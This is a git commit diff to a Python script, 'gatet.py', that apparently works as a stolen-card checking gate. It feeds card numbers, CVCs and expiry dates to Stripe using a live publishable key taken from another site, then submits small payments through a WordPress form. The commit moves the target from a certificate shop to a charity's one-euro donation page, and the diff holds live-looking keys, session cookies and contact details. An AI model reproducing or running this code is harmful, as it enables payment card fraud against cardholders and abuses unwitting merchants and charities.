f208468911cfc0124d1f5d4d867e78496a6ccc84
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-02-23 14:05:23 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,33 +26,27 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51PRegF00TTHUs6jXfWPyyJG9MN1QGLdlYIx9cM2N8bh9xUbk9KHYimqvIEv0ESIqEZ0cGkUOnOI6U6Onjab2bE7F00cuPapHUq'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&referrer=https%3A%2F%2Fsf-andrei.ungheni.org&time_on_page=22151&key=pk_live_51QfliUFKZ8eMqedqNirmPDModwOs3OSHWEYU6FJVq62B3GHYpXTPhZ0uvNQ43bZ5RmVI2cBXUZZ3YQInvwCjBUNQ00wL6ZnugZ'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2025-02-22%2003%3A34%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_first_add': 'fd%3D2025-02-22%2003%3A34%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
-	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F',
-	    'bp-activity-oldestpage': '1',
-	    '__stripe_mid': 'b9648340-77fe-4e90-9b12-fa83f0a35043e567e3',
-	    '__stripe_sid': '3a1ab7d8-53f9-495d-b00f-ad47c83e39e73ea0e8',
+	    '_ga': 'GA1.1.2058644450.1740293773',
+	    '__stripe_mid': '9c28b911-f7ae-4f19-8aed-1e7a774c7d49da8ea9',
+	    '__stripe_sid': 'd5d40c77-fb62-4373-8368-01019b1a92d1716f79',
+	    '_ga_BQL8LZB454': 'GS1.1.1740293772.1.0.1740293795.0.0.0',
 	}
 	
 	headers = {
-	    'authority': 'skillsboost.net',
+	    'authority': 'sf-andrei.ungheni.org',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-22%2003%3A34%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-02-22%2003%3A34%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F; bp-activity-oldestpage=1; __stripe_mid=b9648340-77fe-4e90-9b12-fa83f0a35043e567e3; __stripe_sid=3a1ab7d8-53f9-495d-b00f-ad47c83e39e73ea0e8',
-	    'origin': 'https://skillsboost.net',
-	    'referer': 'https://skillsboost.net/order-certificate/',
+	    # 'cookie': '_ga=GA1.1.2058644450.1740293773; __stripe_mid=9c28b911-f7ae-4f19-8aed-1e7a774c7d49da8ea9; __stripe_sid=d5d40c77-fb62-4373-8368-01019b1a92d1716f79; _ga_BQL8LZB454=GS1.1.1740293772.1.0.1740293795.0.0.0',
+	    'origin': 'https://sf-andrei.ungheni.org',
+	    'referer': 'https://sf-andrei.ungheni.org/give/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -64,17 +58,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1740195358950',
+	    't': '1740293796319',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=730&_fluentform_4_fluentformnonce=b9534bcd7a&_wp_http_referer=%2Forder-certificate%2F&input_text=Neo&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser20%40gmail.com&phone=%2B66817480671&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&address_1%5Bcountry%5D=&payment_input%5B%5D=PDF%20Item&custom-payment-amount=0.5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': 'ak_hp_textarea=&ak_js=1740293772415&__fluent_form_embded_post_id=2086&_fluentform_3_fluentformnonce=faca494b55&_wp_http_referer=%2Fgive%2F&payment_input%5B%5D=Doneaz%C4%83%201%20Euro&custom-payment-amount=&payment_method=stripe&payment_input_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '4',
+	    'form_id': '3',
 	}
 	
 	r2 = requests.post(
-	    'https://skillsboost.net/wp-admin/admin-ajax.php',
+	    'https://sf-andrei.ungheni.org/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
